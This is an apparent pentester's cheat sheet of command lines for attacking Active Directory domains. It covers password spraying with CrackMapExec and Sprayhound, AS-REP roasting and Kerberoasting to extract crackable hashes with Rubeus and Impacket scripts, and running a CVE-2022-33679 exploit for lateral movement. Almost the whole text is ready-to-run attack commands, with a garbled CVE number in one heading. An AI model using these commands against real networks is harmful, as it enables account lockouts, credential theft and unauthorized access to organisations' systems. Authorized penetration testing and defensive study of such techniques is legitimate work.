### Password Spraying
- Tools
- Check password policy
```
cme <IP> -u 'user' -p 'password' --pass-pol
```
- Enumerate users with credentials
```
enum4linux -u 'username' -p 'password' -P <IP>
```
- Powershell Commands
```
Get-ADDefaultDomainPasswordPolicy Get-ADFineGrainedPasswordPolicy -filter * Get-ADUserResultantPasswordPolicy -Identity <USER>
```
- LDAP Search 
```
ldapsearch-ad.py --server '<DC>' -d <DOMAIN> -u <USER> -p <PASSWPRD> --type pass-pols
```
- More tools
- Test username=password
```
cme smb <DC_IP> -u user.txt -p password.txt --no-bruteforce
```
- Multiple tests, mindful of lockout policies
```
cme smb <DC_IP> -u user.txt -p password.txt
```
- Sprayhound
```
sprayhound -U users.txt -d <DOMAIN> --dc <DC_IP>
```
### ASEREPRoast
- Objective 
	- Identify ASREPRoastable users (accounts that do not require pre-authentication)
- Commands
```
Get-DomainUser -PreauthNotRequired -Properties SamAccountName
```
- Graph Analysis (e.g. with BloodHound)
```
MATCH (u:User {dontreqpreauth:true}), (c:Computer) RETURN p=shortestPath((u)-[*1..]->(c))
```
### Hash Extraction for ASREP
- GetNPUsers.py
```
python GetNPUsers.py <DOMAIN>/ -usersfile <USERNAMES.TXT> -format hashcat -outputfile <HASHES.DOMAIN.TXT>
```
- Rubeus.exe
```
Rubeus.exe asreproast /format:hashcat
```
### Blind Kerberoasting
- Objective is to extract TGS (Ticket Granting Service) hashes
- Rubeus.exe
```
Rubeus.exe kerberoast /domain:<DOMAIN> /dc:<DC_IP> /nowrap:<OUTPUT.TXT>
```
- Alternative Command
```
GetUserSPNs.py -no-preauth "asrep_users" -usersfile <USERLIST.TXT> -dc-host <DC_IP> -k <DOMAIN>
```
### CVE-2022033679 Exploit
- Successfull exploitation results in lateral movement via Pass the ticket
```
python3 cve-2022-33679.py <DOMAIN>/<USER> <TARGET>
```



